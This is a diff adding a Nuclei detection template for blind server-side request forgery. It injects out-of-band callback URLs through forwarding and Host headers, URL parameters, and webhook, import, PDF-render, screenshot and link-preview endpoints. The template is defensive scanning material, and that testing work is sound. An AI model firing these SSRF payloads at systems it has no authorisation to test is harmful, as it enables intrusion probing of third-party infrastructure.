@@ -1,0 +1,175 @@
+id: blind-ssrf-comprehensive-interactsh
+
+info:
+  name: Blind SSRF - Comprehensive OOB Detection via Headers & Parameters
+  author: achraf-chehboun
+  severity: high
+  description: |
+    Detects blind Server-Side Request Forgery using interactsh OOB callbacks injected
+    through commonly overlooked HTTP headers, URL parameters, webhook endpoints, and
+    import/fetch functionality. Targets vectors that WAFs and standard scanners miss:
+    Referer-based SSRF, X-Forwarded-For/Host processing, webhook callbacks, PDF/image
+    rendering, and URL preview/unfurling services.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
+    cvss-score: 9.1
+    cwe-id: CWE-918
+  metadata:
+    max-request: 12
+  tags: ssrf,blind,oob,interactsh,detection-only
+
+http:
+  # Test 1: Header-based blind SSRF (frequently overlooked)
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: http://{{interactsh-url}}/xff-ssrf
+        X-Forwarded-Host: {{interactsh-url}}
+        X-Original-URL: http://{{interactsh-url}}/x-original
+        X-Rewrite-URL: http://{{interactsh-url}}/x-rewrite
+        X-Custom-IP-Authorization: http://{{interactsh-url}}/x-custom
+        Referer: http://{{interactsh-url}}/referer-ssrf
+        Accept: text/html
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: header-blind-ssrf
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  # Test 2: Parameter-based blind SSRF across common param names
+  - raw:
+      - |
+        GET /?url=http://{{interactsh-url}}/param-url HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+      - |
+        GET /?redirect=http://{{interactsh-url}}/param-redirect HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+      - |
+        GET /?callback=http://{{interactsh-url}}/param-callback HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+      - |
+        GET /?dest=http://{{interactsh-url}}/param-dest HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+      - |
+        GET /?next=http://{{interactsh-url}}/param-next HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+      - |
+        GET /?uri=http://{{interactsh-url}}/param-uri HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+      - |
+        GET /?path=http://{{interactsh-url}}/param-path HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: param-blind-ssrf
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  # Test 3: Webhook/import endpoints
+  - raw:
+      - |
+        POST /api/webhook HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+        {"url":"http://{{interactsh-url}}/webhook-ssrf","callback_url":"http://{{interactsh-url}}/callback-ssrf"}
+      - |
+        POST /api/import HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+        {"source":"http://{{interactsh-url}}/import-ssrf","file_url":"http://{{interactsh-url}}/file-ssrf"}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: webhook-import-ssrf
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  # Test 4: PDF/Image render SSRF (wkhtmltopdf, Puppeteer, PhantomJS)
+  - raw:
+      - |
+        POST /api/pdf HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+        {"html":"<iframe src='http://{{interactsh-url}}/pdf-ssrf'></iframe>","url":"http://{{interactsh-url}}/render-ssrf"}
+      - |
+        POST /api/screenshot HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+        {"url":"http://{{interactsh-url}}/screenshot-ssrf"}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: render-ssrf
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  # Test 5: URL preview/unfurl SSRF (Slack-like link previews)
+  - raw:
+      - |
+        POST /api/messages HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+        {"message":"Check this: http://{{interactsh-url}}/unfurl-ssrf","content":"Visit http://{{interactsh-url}}/preview-ssrf for details"}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: unfurl-preview-ssrf
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  # Test 6: SSRF via Host header manipulation
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{interactsh-url}}
+        Accept: text/html
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-Host: {{interactsh-url}}
+        X-Host: {{interactsh-url}}
+        Accept: text/html
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: host-header-ssrf
+        words:
+          - "dns"
+          - "http"
+        condition: or
